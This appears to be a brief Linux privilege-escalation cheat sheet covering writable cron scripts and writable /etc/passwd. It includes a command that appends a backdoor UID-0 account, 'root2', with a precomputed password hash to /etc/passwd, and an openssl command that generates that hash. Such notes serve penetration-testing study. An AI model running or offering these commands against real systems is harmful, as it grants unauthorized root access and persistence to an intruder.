# Insecure File Permissions

## Abusing Cron Jobs

look for executed cron jobs from log, and see if the file is writable

```
grep "CRON" /var/log/syslog
```

## Abusing Password Authentication

if we can write /etc/passwd we can replace the password or create new one with root permission

```
openssl passwd w00t

echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

```
